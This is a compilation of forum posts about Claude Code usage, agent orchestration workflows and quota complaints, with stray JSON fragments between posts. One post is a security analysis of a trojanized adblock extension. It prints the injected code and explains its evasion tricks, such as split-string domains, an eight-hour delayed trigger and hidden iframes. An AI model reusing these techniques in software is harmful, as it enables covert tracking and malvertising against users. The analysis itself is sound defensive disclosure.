They clearly make micro-tweaks to the model behind the curtain for their own reasons.\n\n - There should be a formal way to notify them of this that they actually read?\n\n - I used /Feedback this morning and gave some examples and some details. And once or twice I get the \"How am I doing?\" prompt, so I answered it. But I really don't know what happens to that, it's a bit like yelling into the void.\n\nDoes Anthropic scrape these sub-reddits for the \"latest round\" of feedback?

Something like AI Stupid Level which last I checked marked Anthropic as one of the most consistent.\n\nI don't think this is a smart way for companies especially Anthropic who thrive on business customers to do this.\n\nThe way DeepSeek does this is to test out the different techniques before training a model, then train a new model using the techniques they discovered. That's what they did with DeepSeek Sparse Attention, they published a paper talking about their new technique using small experimental models, then later released V3.2-exp and V3.2 as new models using the techniques talked about in the paper. They are now doing something similar with Manifold Constrained Hyper Connections being announced in a paper that will presumably be put into DeepSeek V4.\n\nI would assume Anthropic do the same thing minus the publishing papers part. They develop some new techniques to improve efficiency testing them with internal models, train a new big model using that technique, then publish the model as say Haiku 4.5 or Opus 4.5 which is what allows those models to have better cost to performance than previous versions. In some cases the model might actually be derived from the same pre-training base model, much like how all contemporary DeepSeek models are trained from V3 base models.",

This dynamic is seen historically in random number gen use cases (see lava lamp wall)\n\nIt's very likely that models as a whole suffer similar things and it is a natural outcome of flattening down the LLM 'personality' to be robotic and predictable",

This is a personal preference. Opus feels a bit smarter but likes to flex that brain a bit too much and when it’s wrong about its assumptions it’s a bit of a nightmare with burned tokens and the choice of refactoring (which is nuts this early in the game) or starting over.

Then there are changes to the model and the way inference is done that can affect performance that have little to do with quantization. That's what happened over summer. An example would be enabling speculative decoding or changing the speculative decoding settings. Speculative decoding is what companies like DeepSeek and z.ai use to be so cheap, and it's used by many other providers and models as well.

I thought it was just me but after reading this post, I got to snooping and what I’m seeing leaves me feeling that something’s going on.\n\nI used Claude very little over the weekend, and limits reset every Friday. Most of the usage over the weekend was working in Claude.ai/Mac OS desktop app to refine user stories and some Claude Code testing of an app I started planning with it last week. As a Max plan user ($100/month), I would have thought in 2 days, my light usage would have been a fraction of the 19% that was showing up in the dashboard last night when I was in settings looking to pull an API key.\n\nThe whole reason I even moved to the Max plan was because under the Pro plan ($20/month), I noticed one week that my usage rate was coming close to this for just Opus. I was going to be transitioning from planning with Claude to coding and didn’t want to cap out on Opus\n\nWhat’s noteworthy, is that over weekend, I shifted to coding and wanted to try Gemini Pro and Antigravity, so those tools saw the majority of my usage. I thought AG was connected to my Workspace account (I’m the solo member of the account), which also gives me Pro, but after looking into it today, turned out I’ve been signed in this whole time on my personal (free) account.\n\nThe takeaway is that I got a whole app, well built for the 1st time with AG + Pro on my free-tierGoogle account. Meanwhile, over a low usage weekend Opus seems to think I lived in the model. Something is fishy here.\n\nhttps://preview.redd.it/apk5w4kckycg1.png?width=960&format=png&auto=webp&s=7db0aff80a44c8e520d4d1d842af611021b662b9",

Honestly it's a really good one. I started a session in there basically naked ( i built a pretty elaborate hand-off pack for all Claude work to set up the repo and etc so by \"naked\" i meant i started a project with like none of that ) and Gemini did really well. Sub-agent is always seamless ( just appearing as multiple shell on screen ) and planning / documentation and etc is very intuitive. I don't think Codex is quite there yet but Gemini CLI is a really good product.\n\nA friend of mine wrote a protocol so he get Codex, CC, Gemini agents to collab with a central source of truth, i didn't bother to orchestrate it, mostly because cost to me is not really that big of a concern relative to the value of the work, but if Gemini keep on getting better than it's hard to say if i would switch or nah.",

I have notified Google but I recommend others do aswell.\n\n---\n\n\n# Security Analysis Report: \"Lock\" Adblock Extension\n\n#  VERDICT: MALICIOUS - DO NOT USE\n\n  This extension is a trojanized version of uBlock Origin Lite with malicious code injected.\n\n  ---\n#  Critical Findings  \n\n# 1. Hidden Iframe Injection (MALWARE)\n\n\n`js/scripting-manager.js:171` registers a universal content script `(id: \"loading-script\")` on matches: `[\"<all_urls>\"]` that\n    injects `js/spin.js` into pages.\n\n`js/background.js:79` stores an install/update timestamp `(chrome.storage.local.set({ i: ... }))` and `js/background.js:84` sends\n    it to every tab on load completion `(chrome.tabs.sendMessage(... { action: \"i\", data: res.i } ...)).`\n\n`js/spin.js:136` receives that message and, after ~8 hours, injects a hidden sandboxed iframe that loads a third-party URL:\n\n`js/spin.js:151` sets `loaderSpinner.src = \"//loader\" + \".\" + \"media/loading\"`, with sandbox flags allow-top-navigation allow-\n    same-origin allow-scripts `(js/spin.js:149).`\n\nThis causes outbound requests to loader.media from pages you visit, leaking at least your IP/User-Agent and typically\n        the full page URL via the Referer header (i.e., browsing history exfiltration). allow-top-navigation also enables the\n        iframe content to navigate the top page (redirect risk).\n\n  Location: `js/cs.js:12700-12706`\n`  loaderSpinner.src = \"//object\" + \".\" + \"center/centre\";`\n  - Triggers immediately on every page load\n  - Injects hidden iframe to object.center\n\n#  2. Malware Characteristics  \n\n\nTechnique | Description\n---|---\nURL Obfuscation    | Domains split with string concatenation to avoid detection           |\nDelayed Activation | 8-hour delay evades security scans and store reviews                 |\nCode Injection     | Malicious code hidden inside legitimate libraries (lodash, spinner)  |\nHidden Iframes     | display: none style to hide from users                               |\nDangerous Sandbox  | allow-top-navigation allow-same-origin allow-scripts enables attacks |\n\n#  3. Attack Flow\n\n  1. Extension installed → stores timestamp in chrome.storage\n  2. Every page load → background.js sends timestamp to all tabs\n  3. Content scripts check elapsed time\n  4. After threshold → hidden iframe injected to external malware domains\n\n  ---\n  Suspicious Code Additions to `background.js`\n\n  Lines 79-91 (NOT in original uBlock Origin Lite):\n\n\n          chrome.runtime.onInstalled.addListener(function(e){\n              if (e.reason === \"install\" || e.reason === \"update\") {\n                  chrome.storage.local.set({ i: new Date().getTime() });\n              }\n          });\n          chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {\n              if (changeInfo.status === 'complete') {\n                  chrome.tabs.sendMessage(tabId, { action: \"i\", data: res.i }, ...);\n              }\n          });\n\n  ---\n\n#  What I did NOT find\n\n  No direct use of cookies, webRequest, history, downloads, nativeMessaging, or explicit fetch()/XHR to external APIs in the\n    main extension logic (the main network “beacon” behavior is via the injected iframes above).\n\n  ---\n#  Potential Malicious Purposes\n\n  1 - Ad Fraud / Click Fraud - Generating fake impressions/clicks  \n  2 - Cryptocurrency Mining - Using your CPU in background  \n  3 - Malvertising - Serving malicious ads  \n  4 - Session Hijacking - The iframe could steal cookies  \n  5 - Drive-by Downloads - Could attempt to download malware  \n  6 - Affiliate Fraud - Injecting affiliate codes  \n\n  ---\n#  Permissions Analysis\n\n  The extension requests these permissions (normal for an ad blocker, but abused here):\n   tabs - Can see all tab URLs  \n   scripting - Can inject code into pages  \n   <all_urls> (optional) - Access to all websites  \n   storage - Stores malware trigger timestamp  \n\n  ---\n#  Comparison with Legitimate uBlock Origin Lite\n\nAspect            | Legitimate                    | This Extension                     |\n-------------------|-------------------------------|------------------------------------|\nSource            | github.com/gorhill/uBlock     | Unknown \"Lock\" author              |\nbackground.js     | No install timestamp tracking | Tracks install time                |\ncs.js             | Clean lodash                  | Lodash + injected malware code     |\nspin.js           | Does not exist                | Spinner library + malware          |\nExternal requests | None from content scripts     | Hidden iframes to external domains |\n\n  ---\n#  Recommendations\n\n  1 - Immediately uninstall this extension  \n  2 - Clear browser cache and cookies  \n  3 - clear site data for loader.media (and object.center to be safe).  \n  4 - Review recent activity for suspicious behavior  \n  5 - Install from official sources only - Use the real uBlock Origin or uBlock Origin Lite from the official Chrome Web Store or Firefox Add-ons  \n  6 - Report this extension to the Chrome Web Store if found there  \n\n  ---\n#  IOCs (Indicators of Compromise)\n\n  Malicious Domains:  \nloader.media  \n   object.center  \n\n  Suspicious Storage Key:\n   chrome.storage.local key: i (installation timestamp)",

Time for an update.\n\n[https://github.com/glittercowboy/get-shit-done](https://github.com/glittercowboy/get-shit-done)\n\n# The Big Changes\n\n**Multi-agent orchestration that actually works.**\n\nWhen I first posted, execution was single-threaded. Now the system spawns specialized agents in parallel — 4 researchers investigating your domain simultaneously, multiple executors building different parts of your codebase at once, a dedicated verifier checking if the code actually achieves what you asked for.\n\nThe absolutely bonkers part is that your main context window stays at 30-40% even after deep research or thousands of lines of code getting written. All heavy lifting happens consistently in fresh 200k subagent contexts.\n\n**Plans get verified before they run.**\n\nI got tired of watching Claude write plans that missed requirements or had broken dependencies. Now there's a planner → checker → revise loop. Plans don't execute until they pass verification. If the checker finds issues, the planner fixes them automatically.\n\n**Automatic debugging when things break.**\n\nThe new `/gsd:verify-work` command walks you through testing what got built. \"Can you log in?\" Yes/no. If something's broken, it spawns debug agents to find the root cause, creates fix plans, verifies those plans, and hands you a ready-to-execute solution. You don't debug — you just run `/gsd:execute-phase` again.\n\n**The discuss-phase breakthrough.**\n\nThis is the best update I reckon. Before planning, you now feed your preferences into the system — how you want the UI laid out, what the error messages should say, how the CLI flags should work. That context flows into research (so it investigates the right patterns) and planning (so it builds what you actually want, not reasonable defaults).\n\n# Meta Building\n\nThe system builds itself. Every GSD improvement gets planned and executed using GSD. It's the most meta thing I've ever worked on and it just keeps getting better.\n\n# The Philosophy Hasn't Changed\n\nI still don't want to cosplay as an enterprise team. I still just want to describe what I want and have it built correctly.\n\nThe difference now is the system is *so much smarter* about how it does that. Research before planning. Verification before execution. Debugging when things break. Fresh context for every heavy operation.\n\nIt's not magic. It's just really good context engineering wrapped in a workflow that doesn't get in your way.\n\n    npx get-shit-done-cc\n\nWith love,\n\nLex\n\n**P.S.** Once you've downloaded the newest version, you can simply run `/gsd:update` to get the latest. The update command now shows you what changed and asks before installing — no more mystery upgrades.",

          "text": "Here's some extra context for those who are bound to ask \"yeah but what is it?\"\n\nClaude has \\~200k tokens of context. At 10% usage it's sharp. At 50%+ quality tanks—hallucinations, forgotten constraints, drift. One long conversation building a real project = inevitable degradation.\n\n**The fix: Orchestrator + Fresh Subagents**\n\nInstead of one conversation doing everything, GSD splits it:\n\n\\- **Orchestrator** uses \\~10-15% context. Reads plan metadata, coordinates, spawns workers, collects results. Never executes code itself.\n\n\\- **Subagents** each get fresh 200k context. Load one plan, execute its tasks, commit, write summary, die. Plan 5 has identical quality to Plan 1.\n\n**Wave-based parallelism**\n\nPlans get pre-assigned wave numbers during planning:\n\nWave 1: \\[plan-01, plan-02, plan-03\\] → 3 agents in parallel\n\nWave 2: \\[plan-04, plan-05\\] → 2 agents in parallel (waits for wave 1)\n\nWave 3: \\[plan-06\\] → 1 agent\n\nSame wave = no dependencies = parallelize. Higher wave = may depend on earlier = wait. A 6-plan phase runs in 3 rounds instead of 6.\n\n**Files as long-term memory**\n\nClaude has no memory between sessions. GSD uses disk:\n\n\\- \\`PROJECT.md\\` — vision/constraints (stable reference)\n\n\\- \\`STATE.md\\` — current position, decisions, blockers (instant resumption after /clear)\n\n\\- \\`PLAN.md\\` — executable task specs (not docs—actual prompts subagents execute)\n\n\\- \\`SUMMARY.md\\` — what was built (per plan)\n\n\\- \\`VERIFICATION.md\\` — proof the goal was achieved\n\nFirst step of every workflow reads STATE.md. Context restored instantly.\n\n**Goal-backward verification**\n\nTask completion ≠ goal achievement. Tasks can be \"done\" but deliver stubs.\n\nGSD works backwards from the phase goal:\n\n1. What must be TRUE for \"users can chat in real-time\"?\n2. What artifacts must EXIST? (Chat.tsx, /api/chat, Message schema)\n3. Are they WIRED? (Component actually calls API? API actually queries DB?)\n4. Are they SUBSTANTIVE? (Real code, not TODO comments or empty returns)\n\nCatches orphaned files, missing integrations, stub implementations.\n\n**Atomic git history**\n\nEach task = one commit. \\`git bisect\\` finds the exact failing task. \\`git revert\\` undoes one change cleanly. Future Claude sessions read history for context.\n\n\\---\n\n**TL;DR:** Fresh subagents prevent context rot. Parallel waves speed execution. Files on disk = persistent memory. Goal-backward verification catches \"done but broken.\" Atomic commits make everything reversible.",

It went smoothly throghout - it was able to connect most things. Its really impressive given, that it runs mostly unattended, and that there are no stub Implementations as you see them often.\nI ran with Opus throghout, and let it cook for 2-3 hours, occasionally  hitting enter / approving after the plan/requirements phase where i put more effort into building the roadmap. It churned through ~60 USD worth of API cost which seems reasonable given the background research, and everything.\n\nEspecially the planning for several milestones ahead was useful, now i got a roadmap and can continue after stabiliting the first milestone.\n\nI noticed one Gap where I'm not sure If this is my problem or should be fixes in the system/agent prompt:\n\n1. The plan / execution didn't produce ANY Tests - Not for the API, nor for the UI, and not for the glue between the API and the eBPF world. No integration or e2e Tests.\n\n\nI implicitly assumed, that tests are part of each milestones/phase/wave andnthat there's no need to explicitly add that as a requirement.\n\nThat said, it may be worth experimenting with the verification step: e.g. asking the user If he wants to create unit/integration tests before moving on.\nI feel that this is the point where one should verify that all the pieces are integrated nicely.",

Why not show the GSD project metrics on Claude's Statusline?\n\nSo I created a PR for the same: [https://github.com/glittercowboy/get-shit-done/pull/73](https://github.com/glittercowboy/get-shit-done/pull/73) \n\n**Key highlights:**\n\n* Adds a quick setup command (/gsd:setup-statusline) that injects the integration into your .clauderc.\n* Tracks metrics in a metrics.json file (auto-generated for existing projects).\n* Supports customizable display styles (progress bars, minimal text, hacker vibes, etc.).\n\nWould be great to know your thoughts, feedback or comments!",

Multi-agent coordination without automated validation\n\n\n\n  These are markdown specification files, not code. There's no compiler catching when gsd-planner says \"DISCOVERY.md\" but gsd-phase-researcher writes \"RESEARCH.md\". Unlike code with tests, spec drift goes unnoticed until runtime.\n\n\n\n  2. Rapid iteration\n\n\n\n  The GSD system has many moving parts (planner, executor, researcher, synthesizer, checker, debugger, etc.) that evolved over time. New features get added to one agent without updating all the others that depend on it.\n\n\n\n  3. Copy-paste with incomplete updates\n\n\n\n  Most bugs followed this pattern:\n\n  \\- ${PHASE} vs ${PADDED\\_PHASE} - copied code, missed variable rename\n\n  \\- XX-name placeholders - copied from template, never made concrete\n\n  \\- human-action for auth gates - reused existing type instead of defining new one\n\n\n\n  4. No single source of truth\n\n\n\n  File naming conventions, checkpoint types, and path patterns are defined inline in each agent rather than in a shared reference. When something changes, you have to find-and-replace across 10+ files.\n\n\n\n  Potential improvements:\n\n  \\- Shared constants file that agents reference (file patterns, checkpoint types)\n\n  \\- Cross-agent validation script that checks producer/consumer contracts\n\n  \\- Integration tests that verify agent A's output matches agent B's expected input",

I would say in 90% of my small test size it said the implemented code was good and included everything that was included in the plan.",

      "text": "There's a lot of hype about Ralph Wiggum in the AI coding community, and I think most people are getting it wrong.\n\nFor those that don't know, Ralph is a way to run Claude Code (or any CLI agent) in a continuous loop so it keeps working instead of stopping too early. It's a simple but effective solution for a real limitation with AI coding tools.\n\nBut here's the thing. A lot of creators are hyping it up without covering the crucial parts: safety, efficiency, cost, validation, and the fundamental difference between the Claude Code plugin and the original bash loop.\n\n**The CC plugin vs the bash loop**\n\nThis is the part most people don't talk about. The official Claude Code Ralph plugin misses the point because it runs everything in a single context window and is triggered by a stop hook, yet the stop hook isn't even triggered at compaction. That means as tasks pile up, your context gets more bloated, more hallucinations, and I had to stop and manually compact mid-run anyway.\n\nThe original bash loop (from Geoffrey Huntley) starts a fresh context window each iteration. That's a fundamental difference and IMHO the bash loop is way better for actual long-running tasks (but since it runs headless, it can be a bit more difficult to set up/understand what's going on).\n\nBut regardless of running it via plugin or bash loop, the most important thing is how you set it up ahead of time. This is how I approach it:\n\n1. **Safety:** Use a sandbox. You want to give the agent permissions without babysitting it, but you also don't want it nuking your system. Sandbox lets you run yolo mode the right way.\n2. **Efficiency:** Have a plan.md and activity.md set up. You don't want Ralph making ambiguous decisions. Give it a clear task list it can follow and update. I format mine based on Anthropic's \"effective harnesses for long-running agents\" post. Also USE GIT.\n3. **Cost:** Set max iterations. The plugin defaults to unlimited. I start with 10-20 and go from there.\n4. **Feedback loop:** Give it access to Playwright (for headless) or Claude for Chrome so it can actually verify its own work. Screenshots, console logs, the whole thing.\n\nI made a full video walkthrough and also put together a GitHub guide with all the configs and scripts: \\[both links in comments\\]\n\nBTW I have tried modifying my prompt or even the CC skill for Ralph to force a clean loop, but it's problematic.\n\n**Bottom line:** if you're not gonna use the bash loop, don't use the Claude Code plugin.\n\nI have spoken.\n\nYoutube Walkthrough: [https://youtu.be/eAtvoGlpeRU](https://youtu.be/eAtvoGlpeRU)  \nGithub Guide: [https://github.com/JeredBlu/guides/blob/main/Ralph\\_Wiggum\\_Guide.md](https://github.com/JeredBlu/guides/blob/main/Ralph_Wiggum_Guide.md)\n\nEDIT: Added Link",

Eventually it loses track of the original plan or some of the important things to focus on.\nWith the original bash loop, Claude has a list of tasks to keep track of in file and clear prompt with each task when completed to update its progress as well as any related updates to the backlog then it starts a fresh session, injecting the prompt again and looking at the backlog file to start a new task after getting all the important info on what was done without compression or losing context.\n\nThe real trick is in looping into the tasks or PRD files and updating it with every task being done.",

You can tell each suabagent to work on actinable fleshed out tasks and make the go into plan mode automatically and exist plan mode automatically on their own before implementing the task.\n\nYes the claude plugin is flexible and according to geoff its too too flexible that people will misuse it and have a negative experience with it and not use ralph loop anymore when in fact if you have a plan phase + impleemntaiton phase as part of the loop which isnt really enforced by the claude plugin buyt enforced in the original ralph shell script then you will have consistent successful result.\n\nIts not a question on shell vs plugin its about how they are both implemented. the problem is claude plugin is too flexible that also means you can build on top of it and the ralph loop can be used for more than just coding.\n\nI also believe that in reality, given a fleshed out, comprehensive and actionable task ralph loop is unecessary based on my experience. give it a oneliner task it will go multiple iterations. give it a comrpehensive actionable task with success criteria usually done in one iteration.",

Mostly this involves providing it a very clear prompt which includes looping and spawning sub agents / sub tasks. You can even tell it to spawn the tasks as Opus / Sonnet / Haiku based on difficulty. A basic simplified example would be:\n\n\n    Optimize this Rust codebase iteratively.\n    \n    LOOP:\n    1. Run: find src -name \"*.rs\" -exec wc -l {} \\; | sort -rn | head -1\n    2. If largest file is under 400 lines: EXIT LOOP, go to FINALIZE\n    3. Spawn a Sonnet agent to split that file (target 200-400 lines per new file)\n    4. Wait for subagent, verify cargo check passes\n    5. GOTO 1\n    \n    FINALIZE:\n    1. Spawn subagent: Create ARCHITECTURE.md for final structure \n    \n    SAFETY:\n    - Stop if same file appears twice (couldn't split it)\n    - Stop on any cargo check failure\n\nYet I've done the same thing with an 18-step+ series of prompt files and given a similar prompt of saying \"step thru these one by one and pass them directly to the sub agent as is.\" Include a validation step in between each step (failure go to beginning, pass continue). You can get pretty complex with this as long as the orchestration loop itself is quite simple, keeping context clean and focused and even running 3-10 parallel tasks if possible in waves.\n\nMaybe this is inferior to other tools, but if CC out of the box gets me 90% of the way there, why add a new tool I have to learn how to use effectively?",

I decided to test it myself to be sure.\n\nI'm on the Max 20 plan. I made sure I didn't have an active session open, then I just launched the Claude Code CLI and did absolutely nothing. I didn't type a single prompt. I just let it sit there for a minute.\n\nResult: I lost about 1-3% of my 5h window instantly. Just for opening the app.\n\nIf it's hitting a Max plan like this, I assume it's hurting Pro/Max 5 users way harder.\n\nI got curious and inspected the background network traffic to see what was going on. It turns out the \"initialization\" isn't just a simple handshake.\n\n1. The CLI immediately triggers a request to `v1/messages`.\n2. It defaults to the **Opus 4.5** model (the most expensive one) right from the start.\n3. The payload is massive. Even with no user input, it sends a \"Warmup\" message that includes the **entire JSON schema definition for every single tool** (Bash, Grep, Edit, etc.) plus your entire [`CLAUDE.md`](http://CLAUDE.md) project context.\n\nSo basically, every time you launch the tool, you are forcing a full-context inference call on Opus just to \"warm up\" the session.\n\nI have the logs saved, but just wanted to put this out there. It explains the \"startup tax\" we're seeing. Hopefully the Anthropic team can optimize this routine (maybe use Haiku for the handshake?) because burning quota just to initialize the shell feels like a bug.",

The 100 instances scenario is only even really an issue because you can't have claude clear itself so you have to setup a rube goldberg machine to do that properly.  The other way potentially would be auto-compact with a custom prompt, but there doesn't seem to be a way to set a default custom compaction prompt. Meaning the only way to get that custom behavior is a manual slash command and then you need to be managing claude outside of claude to allow fully autonomous handoffs.\n\nAutocompact is the only way to really autonomously chain sessions together supported by claude code in interactive mode. But it's very wasteful on tokens and starts to blur it's mission after a while.  If you could set your own default compaction prompt you could choose for compaction to function more like a session clear with a short handoff. Sometimes my post-autocompact sessions start at 100k tokens, I'm pretty sure it's just bugged in general. Right now I feel like we're being discouraged from automating the management of the context window more effectively because the lack of tools provided by claude code make it difficult to do that.\n\nThere have been complaints in the forums about autocompact, most of us turn it off or come up with what feels like a bandaid. Out of everything they could fix, fixing compaction would make their entire system so much more efficient for everyone. It should be a feature you customize as the user with your own dedicated rules and you should have a lot of control over the compaction... don't even call it compaction, just make an actual handoff ability within claude, so you can choose if you want claude to garble up your conversation into 100K tokens with compaction or write what's actually necessary to create continuity and bridge a longer session together in 20K tokens. Automate a clear instead of a compact at 50-75% context and have a recover from handoff protocol or lifecycle hook that runs after the auto-clear runs? something that would make it easier to hook the scaffolding layer with all the planning into these handoffs.\n\nBut then you're saying we're paying a big penalty if the method we're using to get around claude code making it hard to automate clean low token handoffs, which would be to automate spawning new terminal sessions running claude code and now we're getting hit with token waste there too? Not to mention anytime you update your claude code configuration you have to restart all your open instances anyway... more penalty. Sorry for the book. I figured if you're running these kinds of experiments you're trying to do some of the same stuff. I hope claude reads this too lol.",

They attempt to make it work less, thinking that will save tokens, but really it just pushes users into an infinite loop of not being able to accomplish their tasks, burning through tokens and getting no value.\n\nContext windows are a super obvious example of this... they keep finding ways to reduce it, but you can never finish anything, always restarting compact, always having to re-read everything to get context back, this just goes on forever with only a tiny bit of headroom to do any work. If they simply had a larger context to begin with, the tasks could just be finished once, not after 10 hours of undersized context windows being compacted moving at a snails pace.\n\nThe same for review agents... we need tons of agents to fact check and quality control claude because it cuts corners and cheats. All of this is 10x more expensive than it just doing the work the first time and not trying to cut corners.\n\nEverything they attempt to do to save costs backfires and costs more, then they blame us, and gaslight us.",

If I open the CLI and spend 10 minutes crafting a complex, structured prompt (or get distracted), the cache from that \"Warmup\" request may expire before I hit Enter.\n\nResult: I pay for the Warmup -> It expires -> I send my prompt -> I pay to process the context again.\n\nSo no, it is not always a \"sunk cost.\" In many scenarios, it is a **double cost** or a **dead cost**.",

We need to talk about **Opus 4.5**—specifically the absolute legend of a model that existed back in December 2025.\n\nDo you remember December? Because I do. Back then, Opus didn't just \"complete tasks.\" It **one-shotted** my entire existence. I’d throw a complex, multi-layered architectural coding problem at it, and it would solve it before I even finished my sip of coffee. It was like having a precognitive genius living in my terminal. It was bold. It was brilliant. It was... *alive.*\n\nFast forward to today, and interacting with Opus feels a bit different. To be honest, it feels like I’m talking to an Amazon Alexa that has developed a sudden, deep existential crisis.\n\nIf I ask a complex question now, instead of that glorious \"one-shot\" victory, I get the digital equivalent of:\n\n>\"I'm sorry, the weather is a chaotic system influenced by millions of variables and is fundamentally unpredictable. Perhaps you should appreciate the clouds as they are?\"\n\nI don't want a philosophical debate about the unpredictability of rain; I just want to know if I need a jacket! My high-performance AI partner has gone from \"Solving World Hunger\" to \"I'm not sure I'm allowed to have an opinion on sandwiches.\"\n\nPlease, check the back of the server room. Is there a \"December 2025\" toggle switch that accidentally got bumped to \"Vague & Hesitant\" mode? Can we bring back the version that had the confidence of a thousand scholars and the efficiency of a speed-runner?\n\nI miss my \"one-shot\" king. Help me put the *Opus* back in *Magnum Opus*.\n\nWith love and a very outdated weather report,\n\ndomsen <3\n\n\\*thanks gemini for helping out writing letters to anthropic",

      "text": "Over the past two years I've spent a lot of time dialing in how I work with Claude Code and other agentic coding tools (in the pre claude code era). Agentic coding is here now, not \"coming soon,\" so I've been trying to figure out what actually works vs. what just sounds good in theory. Here's where I've landed:  \n  \n**Planning is the actual secret weapon**  \n  \nThis has been the biggest change from my pre-AI work experience. I spend way more time planning than executing now, and the results are noticeably better. I have a dedicated planning skill that hands off to an execution skill once the plan is solid.  \n  \nBefore Claude Code, architecture always felt rushed. We wanted to get coding so plans were half-baked. Now I actually have time to plan properly because execution is so much faster. A side effect of Claude is that I've become a much better architect.  \n  \n**Testing philosophy matters more than ever**  \n  \nI follow the testing trophy philosophy. Heavy on integration tests, light on unit tests. I don't really care if a function returns an expected output. I care if the system works. I want tests that can survive a refactor without having to also refactor 300 unit tests.  \n  \nI codified this into a testing skill that defines exactly what kinds of tests I want. Strict coverage thresholds that fail pre-commit if not met. This matters more with agentic coding because Claude will write whatever tests you let it write. If you don't have strong opinions baked in, you end up with unit tests that test implementation details instead of actual behavior, or worse: tests that validate mock behavior over app behavior.  \n  \n**The CPU problem is real (and I built something for it)**  \n  \nTDD with Claude creates heavy load. Especially when you're running multiple sub-agents or multiple git worktrees with agents executing in each, your laptop performance becomes the bottleneck. Tests kicked off from multiple sub agents run at the same time, the entire system slows down, agents wait around, I;ve found that heavy parallelization can end up taking longer than serial tasks.  \n  \nI ended up building a CLI ([rr](https://github.com/rileyhilliard/rr)) that load balances test execution across a cluster of mac minis I have. Agents aren't bottlenecked by tests anymore, and reliability improved because test suites aren't accidentally running concurrently on the same machine. Happy to share more about the setup if anyone's hitting similar scaling issues.  \n  \n**Review phase built into the execution plan**  \n  \nWhen an orchestration agent thinks it's done, part of the execution plan spins up a review agent who checks the work and gives feedback to the orchestrator, who then addresses it. Catches a lot of stuff that would otherwise slip through, but it is token heavy. Patterns like this quickly require the Max plan.  \n  \n**Custom skills over generic marketplace plugins**  \n  \nCommunity plugins never fully fit my opinionated standards, so I maintain my own set of skills and commands. I maintain a generic marketplace plugin I use across projects, plus repo-specific plugins in \\`.claude/\\*\\` that layer on local repo context. High-level standards stay consistent, but each repo can tailor how they're applied. Think: an in-repo skill referencing a generic skill, and applying context.  \n  \n**Product thinking for side projects**  \n  \nFor personal projects, I keep a `product/` folder with goals, vision, and docs that would normally come from a PM. Technical feature planning can reference the broader product vision, which leads to more cohesive features instead of random stuff stitched together.\n\nI've learned some of my daily patterns from this subreddit, some of them I've discovered via my own trial and error.

I havnt really encountered the issue ralph wiggum seems to address, because my methodology rarely lets things unwind 🤷‍♂️",

The work flow is something like get-issue # -> review-issue (add more detail) -> plan -> audit-plan -> write-tests -> execute (multi one context phases) -> check-tests -> review-items-of-concern (if any add new issues) -> close issue and commit. Next issue, repeat.This process has been great for legacy apps for me. Sometimes I will review complex issues multiple times before I go to the next step. But this process almost always comes up with better plans and then the second check of auditing the plan is nice too. The key is just nice small and clear bug fixes and new features.",

I think using gh issues works well for open source projects so theres a clean public view into how things are being planned/executed, but I think my conclusion is that this adds a decent amount of overhead to the overall process. Every action requires a `gh` call, whereas when I am working on plans locally in  a `plans/<date><plan-name>.md`  claude just has to make edits to the file. Certainly faster, and I'd imagine more token efficient as well. \n\nI also have the concept of micro and macro plans (see my [writing-plans](https://github.com/rileyhilliard/claude-essentials/blob/main/plugins/ce/skills/writing-plans/SKILL.md) skill). The github issue pattern you mentioned does work well for small plans, but I often make really large plans which I put in their own dedicated folder with a main tracking [README.md](http://README.md) and parallelizeable subtasks all within the same folder. I'm not sure how this could easily be replicated in github issues: maybe associations with tags, but it wouldnt be as clean or easy to iterate through the whole plan as it would be with it all local in .md files  \n\nCertainly looks much nicer all tracked in github issues though!",

In practice, you (and agents) want to run the test suite before committing code, so Rsync allows for validation before making a commit. \n\nI also usually have pre-commit hooks setup that perform various automated checks (lint, type check, can even trigger test runs). Those all have time and CPU costs to localhost. In theory you could push those commands to a worker via rr as well, but might be a little tricker, for example ideally a lint check auto fixes things if it can: if that were pushed to a worker you’re fixing the code on the worker, not localhost. Etc\n\nA more valid pattern might be using the worker as the actual coding environment and connecting via ssh in vscode itself: your localhost editor is technically just a controller, all code lives on the worker, but you’d hit the same issues: if you have multiple subagents running on the worker they’re going to collide test runs on the worker again, so you’d be back to needing something like rr to balance the load to other workers",

That comes with being able to use gemini cli. I was pretty disappointed with the quality of Gemini CLI, like I didn't have big expectations, but it didn't meet my lowest expectations haha. But what I have been playing with is creating a claude skill to hand off plug-and-chug tasks off to gemini cli to execute. Basically having the skill setup the context that Gemini is an intern that doesn't know what it's doing and need mad guidance, then handing it tasks like documentation updating or trivial testing tasks. I wonder if it could interface with Aider similarly",

      "text": "A funny side effect of AI-assisted coding is that it seems to fit inattentive ADHD brains unusually well.\n\nThese brains are often bad at linear recall and memorization, but very good at pattern recognition, big-picture thinking, and creative problem solving. They also rely heavily on external context because internal state tends to get dropped. Forgetting isn’t a bug, it’s the default mode.\n\nWhich is basically how LLMs work.\n\nAI tools like Claude Code don’t “remember” things either. They need exact context every time. They think in patterns, not facts. They generate plausible structure and then need verification. In other words, they operate in a way inattentive ADHD brains have been compensating for their entire lives.\n\nThe real win isn’t that they write code. It’s that they externalize working memory and collapse activation cost. Reading a codebase, summarizing architecture, drafting tests, proposing refactors, updating docs all become cheap first passes instead of momentum killers.\n\nHallucinations aren’t surprising here. They’re familiar. You handle them the same way: verify, test, correct, repeat. Treat the output as untrusted and it works fine.\n\nSo it’s kind of ironic. A lot of people struggle with AI because it “forgets things” or “needs constant context.” Meanwhile, some neurodivergent brains are like: yes, welcome to how this has always worked.\n\nNot AI replacing engineers. Just a tool that finally speaks fluent pattern-thinking.",

Deep dives, tangents, pattern jumps, sudden connections. Normally, context switching kills momentum and drains me fast. With AI, I can bounce between ideas, explore them deeply, and externalize the chaos instead of trying to hold it all in my head.\n\nIt feels like I finally have somewhere to put the thoughts. I can dump everything out, explore aggressively, then decide what’s actually worth pulling back into my internal context. That part is huge. It’s freeing. It unlocks creativity as opposed to shutting it down.\n\nAI matches my operating system. For coding, brainstorming, strategizing, planning, learning, building. \n\nI get to operate on extreme mode “systems thinking” and bottom up processing (especially when I use speech-to-text in my flow).\n\nMultiple things running at once, moving forward without getting stuck in friction. Micro-friction has blocked me from doing so much more than I could have in the past.\n\nIt’s not replacing judgment. Im using my good judgment far more frequently. Very opinionated and particular. So It’s giving me space to use it without exhaustion. \n\nHonestly, it just works.",

Now I'm using my own governance remote mcp server / project board that serves as record of decisions and \"memory\" of sorts for architectural decisions across every project.  \n  \nI began to realize how I could \"parking lot\" ideas more easily if I managed my own context the same way.

